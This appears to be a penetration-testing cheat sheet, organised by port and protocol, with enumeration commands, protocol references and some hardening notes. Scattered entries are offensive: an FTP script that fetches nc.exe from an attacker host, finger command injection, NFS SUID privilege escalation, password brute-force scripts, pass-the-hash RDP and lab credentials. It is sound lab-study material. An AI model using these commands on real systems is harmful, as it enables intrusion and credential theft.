tftp binary tftp put example . exe / windows / system32 / example . exe Receive file tftp binary tftp get / windows / system32 / example . exe Tools Hardening References VNC - 5900/tcp Quick Reference Configuration files .vnc / etc / vnc / config $HOME / .vnc / config / etc / sysconfig / vncservers / etc / vnc.conf Registry locations \\ HKEY_CURRENT_USER \\ Software \\ ORL \\ WinVNC3 \\ HKEY_USERS \\ . DEFAULT \\ Software \\ ORL \\ WinVNC3 reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKCU \\ Software \\ TightVNC \\ Server reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver reg QUERY HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Description key: 0 x238210763578887 Connect over SSH tunnel ssh -L5901:127.0.0.1:5901 charix@10.10.10.84 vncviewer 127 .0.0.1::5901 vncviewer 127 .0.0.1::5901\u200b -passwd\u200b secret Tools Hardening References WebDev Quick Reference Check Capabilities: davtest - url http : // grandpa . htb / Interact Command-line WebDAV client for Unix: http://www.webdav.org/cadaver/ Commands: https://www.systutorials.com/docs/linux/man/1-cadaver/ cadaver http : // 10 . 10 . 10 . 15 Upload file: curl --upload-file ./example.php --user user:password http:// ip /webdav_url Exploits: IIS 6.0 in Microsoft Windows Server 2003 R2 (CVE-2017-7269): iis_webdav_scstoragepathfromurl - https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl - https://github.com/edwardz246003/IIS_exploit - https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html - https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7269/CVE_2017_7269.pl IIS 6.0 Tools Hardening References X11 - 6000/tcp Quick Reference Configuration files /etc/Xn.hosts /usr/lib/X11/xdm Search through all files for the command xhost + or /usr/bin/X11/xhost + /usr/lib/X11/xdm/xsession /usr/lib/X11/xdm/xsession-remote /usr/lib/X11/xdm/xsession.0 /usr/lib/X11/xdm/xdm-config DisplayManager*authorize:on Tools Hardening References","title":"Ports and protocols"},{"location":"ports-and-protocols/#template","text":"## Name - port / tcp_or_udp ** Quick Reference ** ** Tools ** ** Hardening ** ** References **","title":"Template"},{"location":"ports-and-protocols/#citrix-1494tcp","text":"Quick Reference Enumeration: ./citrix-pa-scan { IP_address/file | - | random } [ timeout ] citrix-pa-proxy.pl IP_to_proxy_to [ Local_IP ]","title":"Citrix - 1494/tcp"},{"location":"ports-and-protocols/#dhcp","text":"Quick Reference Get new IP address from DHCP: Send DHCPDISCOVER Receive DHCPOFFER dhclient","title":"DHCP"},{"location":"ports-and-protocols/#dns-53tcp","text":"Quick Reference DNS on TCP Check for zone transfers Maybe DNS Sec enabled Configuration files host . conf resolv . conf named . conf Order of name resolution: / etc / nsswitch . conf DNS sever Information: / etc / resolv . conf Forward Lookup whois whois example.com whois 50 .7.67.186 ( reverse ) Reverse Lookup write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1 .1.168.192.in-addr.arpa. PTR for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works Zone Transfers Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns - server Domain name: dig axfr @dns - server domain . name host - l example . com ns1 . example . com dnsrecon - d $ ip - t axfr nmap $ ip --script=dns-zone-transfer -p 53 Simple Zone Transfer Script: #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ] ; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $( host -\u00ad\u2010t ns $1 | cut -\u00ad\u2010d -\u00ad\u2010f4 ) ; do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server | grep has address done Bruteforcing fierce - dns site . com fierce - dns site . com - dnserver ns1 . site . com dnsenum site . com \u2013 dnsserver ns1 . site . com dnsenum site . com - f / root / hostlist . txt Subdomain bruteforcing for ip in $( cat list.txt ) ; do host $ip . $website ; done for domain in $( cat /usr/share/wordlists/dnscan/subdomains-100.txt ) ; do host $domain .mydomain.com ; sleep 2 ; done | grep has | sort -u Reverse dns lookup bruteforcing for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -v not found DNS Recon Workflow (WIP) 1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. Tools Dnsrecon dnsrecon -r 127 .0.0.0/24 -n 10 .10.10.29 dnsrecon -r 127 .0.1.0/24 -n 10 .10.10.29 dnsrecon -r 10 .10.10.0/24 -n 10 .10.10.29 dnsrecon -d thinc.local -n 10 .11.1.220 -t axfr -r 10 .11.1.0/24 dnsrecon -d site.com host host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error host -l site.com ns2.site.com host -l friendzone.red 10 .10.10.123 | grep has address | awk {print $1} nslookup nslookup ip nslookup site.com nslookup -query = mx site.com nslookup -query = ns site.com nslookup -query = any site.com set type = a google.com server ns1.google.com google.com dig # Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} # {global-d-opt} host [@local-server] {local-d-opt} # [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com dig site.com dig site.com A dig +nocmd shite.com MX +noall +answer dig +nocmd site.com NS +noall +answer dig +nocmd site.com A +noall +answer dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer fierce: https://github.com/davidpepper/fierce-domain-scanner scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for General checks: fierce - dns example . com Wordlist attack: fierce - dns example . com - wordlist hosts . list recon-ng use recon / contacts / gather / http / api / whois_pocs set DOMAIN example . com run use recon / hosts / enum / http / web / xssed use recon / hosts / gather / http / web / google_site use recon / hosts / gather / http / web / ip_neighbor dnsenum dnsenum $ ip dnsrecon dnsrecon dnsrecon \u2010 d example . com \u2010 t axfr dnsenum dnsenum example . com subbrute Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting knock Wordlist based subdomain bruteforcing Virustotal search Sublist3r Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally Online Services https://dnsdumpster.com/ Hardening References Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/","title":"DNS - 53/tcp"},{"location":"ports-and-protocols/#elasticsearch-9200tcp","text":"Quick Reference Interesting APIs Description URL Config information, OS, JVM version curl - XGET http : // ip : 9200 / _nodes ? pretty = true Shutdown curl - XPOST http : // ip : 9200 / _cluster / nodes / _master / _shutdown Dump data curl http:// ip :9200/_search?size=10000 pretty=true Snapshots _snapshot Hardening elasticsearch . yml - to prevent dynamic scripting: script . disable_dynamic : true https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1","title":"ElasticSearch - 9200/tcp"},{"location":"ports-and-protocols/#finger-79tcp","text":"Quick Reference User enumeration finger @example.com finger a b c d e f g h @example.com finger 1 2 3 4 5 6 7 8 9 0 @target_host finger admin@example.com finger user@example.com finger 0 @example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger - user - enum . pl - U seclists / Usernames / Names / names . txt - t ip https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh Finger Redirect finger @target_host1@target_host2 Command execution finger |/bin/id@example.com finger |/bin/ls -a /@example.com Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com References Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html","title":"Finger - 79/tcp"},{"location":"ports-and-protocols/#ftp-21tcp","text":"Quick Reference Scan for anonymous FTP: nmap \u2010 v \u2010 p 21 - \u00ad\u2010 script = ftp \u2010 anon . nse 192 . 168 . 11 . 200 - 254 NSE: nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 IP Anonymous login ftp ip_address Username : anonymous Password : any @ email . com ( if prompted ) Clone: wget - r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS) Config files ftpusers ftp . conf proftpd . conf MITM pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl Common FTP Commands GET .. / .. / .. / boot . ini GET .. / .. / .. / .. / .. / .. / boot . ini MGET .. / .. / .. / boot . ini MGET .. / .. / .. / .. / .. / .. / boot . ini Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory Bruteforcing patator ftp_login host = 10 .11.1.220 port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = /root/oscp/lab-net2019/ftp-open.txt port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = FILE0 port = 21 user = COMBO0 password = COMBO1 0 = /root/oscp/lab-net2019/ftp-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 -x ignore:fgrep = \u2019cannot log in.\u2019 -x ignore:fgrep = \u2019Login incorrect\u2019 -l ftp_spray TCP FTP Bounce Scan: nmap \u2013 top - ports 1000 - vv - Pn - b anonymous : password @10.11.1.125 : 21 127.0.0.1 Script FTP echo open ( YOUR IP ) 21 C :\\ share \\ ftp . txt ( Writeable Directory on target ) echo USER pwnt C :\\ share \\ ftp . txt echo passwd C :\\ share \\ ftp . txt ( Password for your FTP Server ) echo bin C :\\ share \\ ftp . txt ( Sets transfer up for binary files / bytes ) echo GET nc . exe C :\\ share \\ nc . exe C :\\ share \\ ftp . txt echo bye C :\\ share \\ ftp . txt ftp - v - n - s : C : \\ share \\ ftp . txt Tools Hardening References","title":"FTP - 21/tcp"},{"location":"ports-and-protocols/#imap-134tcp-993tcp","text":"Quick Reference https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions Connecting Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client - connect IP : 993 openssl s_client - connect IP : 993 - crlf - quiet Command Format Input: RandomStringID command Response: RandomStringID OK ANSWER DETAIL Login Login Method: A1 login someuser @example . com My_P @ssword1 When AUTH = PLAIN (SASL PLAIN Method) echo - en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username , password When AUTH = LOGIN (SASL AUTH LOGIN) echo - en someuser@example.com | openssl base64 echo - en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password SASL PLAIN as an Admin User (Masquerade another user) authcidNULauthzidNULpassword echo - en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword Capability: a capability Retrieving Emails and Modifying the Inbox Namespaces: n namespace Examine Inbox: ex1 EXAMINE INBOX List of folders L1 LIST * LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Status aa STATUS INBOX ( MESSAGES ) Fetch Messages aa SELECT INBOX f1 FETCH 1 BODY [] f2 fetch 2 RFC822 f3 fetch 1 : 4 ( BODY [ HEADER . FIELDS ( Subject )]) Unseen s search UNSEEN Delete d store 2 + FLAGS ( \\ Deleted ) e expunge Example Session 1 \\ . telnet brainfuck . htb 143 2 \\ . a1 LOGIN orestis kHGuERB29DNiNE 3 \\ . a2 LIST * 4 \\ . a3 EXAMINE INBOX 5 \\ . a4 FETCH 1 BODY [] 6 \\ . a5 FETCH 2 BODY [] Tools Hardening References","title":"IMAP - 134/tcp 993/tcp"},{"location":"ports-and-protocols/#irc-8067tcp","text":"Quick Reference Version / Connect irssi -c 10 .10.10.117 --port 8067","title":"IRC - 8067/tcp"},{"location":"ports-and-protocols/#ldap-389tcp","text":"Quick Reference Configuration files containers . ldif ldap . cfg ldap . conf ldap . xml ldap - config . xml ldap - realm . xml slapd . conf Brute-forcing: nmap - p 389 --script ldap-brute --script-args ldap.base= cn=schema,dc=targetbox,dc=target (TARGET IP ADDRESS) -vv Dump: ldapdomaindump - u example \\ example 10 . 10 . 10 . 10 ldapsearch - LLL - x - H ldap : // domain - b - s base (objectclass=*) ldapsearch - LLL - x - H ldap : // domain - b - s base CN=example,DC=LOCAL ldapsearch - h EGOTISTICAL - BANK . LOCAL - p 389 - x - b DC=EGOTISTICAL-BANK,DC=LOCAL http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html Tools Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool Hardening References","title":"LDAP - 389/tcp"},{"location":"ports-and-protocols/#memcache","text":"Quick Reference Connecting: telnet localhost 11211 Information gathering nmap - p 11211 --script memcached-info memcstat --servers=127.0.0.1 Read value memccat --servers = 192 .64.38.3 --username = user --password = pass flag $ nc localhost 112111 get password VALUE password 0 6 3dw4rd END Key information and dump values version stats items STAT items:3:number 1 STAT items:3:age 498 STAT items:22:number 1 STAT items:22:age 498 END stats cachedump stab-id limit stats cachedump 3 100 ITEM views.decorators.cache.cache_header..cc7d9 [ 6 b ; 1256056128 s ] END Increment decrement incr id 1 decr id 1 Set new entry set phone 0 60 9 123456789 Modify value replace key 0 0 2 new - value prepend address 0 0 6 house append address 0 0 6 , 73301 Delete delete old_address flush_all 30 # invalidate all keys after 30 s Dump all keys memcdump --verbose --debug --servers=127.0.0.1 | tee keys.lst Dump all key-values memcached-tool localhost:11211 dump | less while read -r key ; do [ -f $key ] || echo get $key | nc localhost 11211 $key .dump ; done ( memcdump --server localhost ) memcdump --servers = localhost | xargs -L1 -I% sh -c echo get % | nc localhost 11211 memcmd function memcmd () { exec { memcache } /dev/tcp/localhost/11211 printf %s\\n%s\\n $* quit ${ memcache } cat ${ memcache } } 1.4.31 and above memcmd lru_crawler metadump all 1.4.30 and below memcmd stats items memcmd stats cachedump 1 0 for id in $( memcmd stats items | grep -o :[0-9]\\+: | tr -d : | sort -nu ) ; do memcmd stats cachedump $id 0 done Tools Python Library: https://github.com/abstatic/python-memcached-stats Bruteforce #!/usr/bin/python3 import subprocess dictionary = open ( /usr/share/wordlists/rockyou.txt ) for pwd in dictionary : out = subprocess . getoutput ( memcstat --servers=192.64.38.3 --username=student --password= + pwd ) if len ( out ) 0 : print ( out ) print ( PASSWORD: + pwd ) break Hardening References","title":"Memcache"},{"location":"ports-and-protocols/#modbus-502tcp","text":"Quick Reference Tools Map a SCADA MODBUS TCP based network: https://packetstormsecurity.com/UNIX/scanners/modscan.py.txt Hardening References","title":"Modbus - 502/tcp"},{"location":"ports-and-protocols/#nfs-2049tcp","text":"Quick Reference Configuration files / etc / exports / etc / lib / nfs / xtab Enumeration nmap -sV --script = nfs-* 192 .168.44.133 nmap -sV --script = nfs-ls 192 .168.44.133 //same result as rpcinfo nmap -sV --script = nfs-* 192 .168.44.133 Enumerate NFS shares: showmount - e hostname / ip_address Mount NFS shares: mount -t nfs ip_address:/directory_found_exported /local_mount_point mount -t nfs 192 .168.1.72:/home/vulnix /tmp/mnt -nolock / etc / exports file contains configurations and permissions of which folders/file systems are exported to remote users Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user \"nfsnobody\" when connected. https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/ no_root_squash - Gives the remote user root access to the connected system With limited user account: cp / bin / bash / shared Then mount the share: mount - t nfs server : / shared / mnt / and run chown root : root bash chmod u + s bash Run the file with limited user account: / shared / bash Tools NFS shell - https://github.com/NetDirect/nfsshell Provides user level access to an NFS server, over UDP or TCP, supports source routing and \"secure\" (privileged port) mounts. nfsshell host ip nfsshell mount name of the share nfsshell gid 1000 nfsshell uid 1000 nfsshell put example nfsshell chmod 0777 example Hardening References http://linuxadministrative.blogspot.com/2014/09/showmount-command-examples.html Exploiting Network File System, (NFS), shares: http://www.vulnerabilityassessment.co.uk/nfs.htm","title":"NFS - 2049/tcp"},{"location":"ports-and-protocols/#ntp-123tcp","text":"Quick Reference Configuration files ntp . conf Tools ntptrace - Query to determine from where the NTP server updates its time and traces the chain of NTP servers from a source ntpdc - Query the ntp Deamon about its current state and to request changes in the state ntpdc - c monlist IP_ADDRESS ntpdc - c sysinfo IP_ADDRESS ntpq - Monitors NTP daemon ntpd operations and determine performance Hardening NTPSec IPTables logging References","title":"NTP - 123/tcp"},{"location":"ports-and-protocols/#pop3-110tcp","text":"Quick Reference Login USER username PASS password Other commands Command Comment USER Your user name for this mail server PASS Your password. QUIT End your session. STAT Number and total size of all messages LIST Message# and size of message RETR message# Retrieve selected message DELE message# Delete selected message NOOP No-op. Keeps you connection open. RSET Reset the mailbox. Undelete deleted messages. TOP 1 0 Return headers only TOP 1 10 Return headers and first 10 lines of body Tools Hardening References","title":"POP3 - 110/tcp"},{"location":"ports-and-protocols/#pptp-l2tp-vpn-500tcp-1723tcp","text":"Quick Reference Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html PSK Cracking using IKE Aggressive Mode: http://www.ernw.de/download/pskattack.pdf Penetration Testing IPsec VPNs: https://www.symantec.com/connect/articles/penetration-testing-ipsec-vpns Scanning and probing a VPN (ikescan): https://www.radarhack.com/dir/papers/Scanning_ike_with_ikescan.pdf","title":"PPTP-L2TP-VPN - 500/tcp 1723/tcp"},{"location":"ports-and-protocols/#rdp-3389tcp","text":"Quick Reference PTH: xfreerdp / u : testing / d : thinc / pth : 31 d6cfe0d16ae931b73c59d7e0c089c0 / v : 192 . 168 . 1 . 23 Tools List the RDP Connections History: https://github.com/3gstudent/List-RDP-Connections-History Hardening References RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation: https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6","title":"RDP - 3389/tcp"},{"location":"ports-and-protocols/#rlogin-513tcp","text":"Quick Reference Locating files find / - name . rhosts locate . rhosts Manual login: rlogin hostname - l username Tools Hardening References http://0daysecurity.com/penetration-testing/enumeration.html","title":"rlogin - 513/tcp"},{"location":"ports-and-protocols/#smb-samba-netbios-137udp-138udp-137tcp-139tcp-445tcp","text":"","title":"SMB-Samba-NetBIOS - (137/udp 138/udp), (137/tcp 139/tcp), 445/tcp"},{"location":"ports-and-protocols/#quick-reference","text":"","title":"Quick Reference"},{"location":"ports-and-protocols/#summary","text":"Summary In computer networking, Server Message Block ( SMB ) , one version of which was also known as Common Internet File System ( CIFS ) , operates as an application - layer network protocol . Mainly used for providing shared access to files , printers , and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter - process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as \" Microsoft Windows Network \" before the subsequent introduction of Active Directory . Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component). SMB can run on top of the session (and lower) network layers in several ways: Directly over TCP , port 445 via the NetBIOS API , which in turn can run on several transports. On UDP ports 137 , 138 TCP ports 137 , 139 ( NetBIOS over TCP / IP ); On several legacy protocols such as NBF , IPX / SPX . The SMB Inter-Process Communication ( IPC ) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client first connects to an SMB server. Ports netbios-ns 137 / tcp # (NBT over IP) NETBIOS Name Service netbios-ns 137 / udp . netbios-dgm 138 / tcp # (NBT over IP) NETBIOS Datagram Service netbios-dgm 138 / udp . netbios-ssn 139 / tcp # (NBT over IP) NETBIOS session service netbios-ssn 139 / udp . microsoft-ds 445 / tcp # (SMB over IP) If you are using Active Directory (used when SMB is used directly on TCP stack, without using NetBIOS)","title":"Summary"},{"location":"ports-and-protocols/#version","text":"Version enumeration auxiliary / scanner / smb / smb_version Server Message Block (SMB) Versions SMB Version Windows version CIFS Microsoft Windows NT 4.0 SMB 1.0 Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2 SMB 2.0 Windows Vista Windows Server 2008 SMB 2.1 Windows 7 and Windows Server 2008 R2 SMB 3.0 Windows 8 and Windows Server 2012 SMB 3.0.2 Windows 8.1 and Windows Server 2012 R2 SMB 3.1.1 Windows 10 and Windows Server 2016 Samba Version Enumeration #!/bin/sh # Author: rewardone # Description: # Requires root or enough permissions to use tcpdump # Will listen for the first 7 packets of a null login # and grab the SMB Version # Notes: # Will sometimes not capture or will print multiple # lines. May need to run a second time for success. if [ -z $1 ] ; then echo Usage: ./smbver.sh RHOST {RPORT} exit ; else rhost = $1 ; fi if [ ! -z $2 ] ; then rport = $2 ; else rport = 139 ; fi tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2 /dev/null | grep -i samba\\|s.a.m | tr -d . | grep -oP UnixSamba.*[0-9a-z] | tr -d \\n echo -n $rhost : echo exit | smbclient -L $rhost 1 /dev/null 2 /dev/null echo sleep .1","title":"Version"},{"location":"ports-and-protocols/#scanning","text":"References: https://www.hackingarticles.in/a-little-guide-to-smb-enumeration https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap nmap ls -lh /usr/share/nmap/scripts/smb* nmap --script safe -p445 $ip nmap --script smb-protocols -p445 $ip nmap -p 139 ,446 $ip --open nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010* $ip nmap \u2010v \u2010p 139 ,445 --script vuln $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010vuln* $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010security\u2010mode $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010os-discovery $ip nmap \u2010v \u2010p 139 ,445 -\u2010script smb\u2010check-vulns --script-args = unsafe = 1 $ip smb-vuln-conficker smb-vuln-cve2009-3103 smb-vuln-ms06-025 smb-vuln-ms07-029 smb-vuln-regsvc-dos smb-vuln-ms08-067 nmap --script smb-brute.nse -p445 ( TARGET IP ADDRESS ) nmap -p 139 .445 --script smb-enum-users ( TARGET IP ADDRESS )","title":"Scanning"},{"location":"ports-and-protocols/#enable-disable-status","text":"Detect, enable and disableyeha SMBv1, SMBv2, and SMBv3 in Windows and Windows Server: https://support.microsoft.com/en-gb/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and Windows Server 2012 R2 2016: PowerShell methods SMB v1 Detect: Get - WindowsFeature FS - SMB1 Disable: Disable - WindowsOptionalFeature - Online - FeatureName smb1protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName smb1protocol SMB v2/v3 Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 8.1 and Windows 10: PowerShell method SMB v1 Protocol Detect: Get - WindowsOptionalFeature \u2013 Online \u2013 FeatureName SMB1Protocol Disable: Disable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol Enable: Enable - WindowsOptionalFeature - Online - FeatureName SMB1Protocol SMB v2/v3 Protocol Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration \u2013 EnableSMB2Protocol $ true Windows 8 and Windows Server 2012 SMB v1 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB1Protocol Disable: Set - SmbServerConfiguration - EnableSMB1Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB1Protocol $ true SMB v2/v3 on SMB Server Detect: Get - SmbServerConfiguration | Select EnableSMB2Protocol Disable: Set - SmbServerConfiguration - EnableSMB2Protocol $ false Enable: Set - SmbServerConfiguration - EnableSMB2Protocol $ true Windows 7, Windows Server 2008 R2, Windows Vista, and Windows Server 2008 SMB v1 on SMB Server Default configuration = Enabled (No registry key is created), so no SMB1 value will be returned Detect: Get - Item HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB1 - Type DWORD - Value 1 \u2013 Force SMB v2/v3 on SMB Server Detect: Get - ItemProperty HKLM : \\ SYSTEM \\ CurrentControlSet \\ Services \\ LanmanServer \\ Parameters | ForEach - Object { Get - ItemProperty $ _ . pspath } Disable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 0 \u2013 Force Enable: Set - ItemProperty - Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters SMB2 - Type DWORD - Value 1 \u2013 Force Disable SMB Client SMB v1 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb20/nsi sc.exe config mrxsmb10 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start = auto SMB v2/v3 on SMB Client Detect: sc . exe qc lanmanworkstation Disable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/nsi sc.exe config mrxsmb20 start = disabled Enable: sc.exe config lanmanworkstation depend = bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb20 start = auto","title":"Enable / Disable / Status"},{"location":"ports-and-protocols/#other","text":"NetBIOS suffixes For unique names: 00 : Workstation Service ( workstation name ) 03 : Windows Messenger service 06 : Remote Access Service 20 : File Service ( also called Host Record ) 21 : Remote Access Service client 1 B : Domain Master Browser \u2013 Primary Domain Controller for a domain 1 D : Master Browser For group names: 00 : Workstation Service ( workgroup / domain name ) 1 C : Domain Controllers for a domain 1 E : Browser Service Elections User enumerate: scanner / smb / smb_lookupsid Bruteforcing: auxiliary/scanner/smb/smb_login while read USER ; do echo $USER smbmap -H 10 .10.10.172 -u $USER -p $USER ; done userslist patator smb_login host = 10 .121.1.33 domain = CONTOSO user = COMBO00 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -l smb_brute patator smb_login host = FILE0 domain = CONTOSO.LOCAL user = COMBO10 password = COMBO11 0 = /root/oscp/lab-net2019/smb-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u201dSTATUS_LOGON_FAILURE\u201d \u2013timeout 100 \u2013threads = 2 \u2013rate-limit = 2 Mount SMB share sudo apt-get install cifs-utils mkdir /mnt/ $shareName mount -t cifs // $ip / $shareName /mnt/ $shareName -o username = $username ,password = $password ,domain = $domain mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username = root,workgroup = WORKGROUP mount -t cifs //10.10.10.134/backups /mnt/share -o user = ,password = net use X : \\\\ server \\ sharename / USER : domain \\ username password / PERSISTENT : YES Null Session Enumeration (enabled by default in SMB1) net use \\\\ 192 . 168 . 1 . 1 \\ ipc$ / u : net view \\\\ ip_address rpcclient -U ip ( give empty password ) srvinfo enumdomusers getdompwinfo Use UpTime to guess patch level: https://github.com/SpiderLabs/Responder/blob/master/tools/FindSMB2UPTime.py python FindSMB2UpTime.py 172 .16.80.10 Samba Configuration Files / etc / samba / smb . conf smb . conf lmhosts Test reload configuration testparm - v service smb restart User creation: smbpasswd - a username","title":"Other"},{"location":"ports-and-protocols/#tools","text":"nmblookup Query NetBIOS names and map them to IP addresses in a network Using 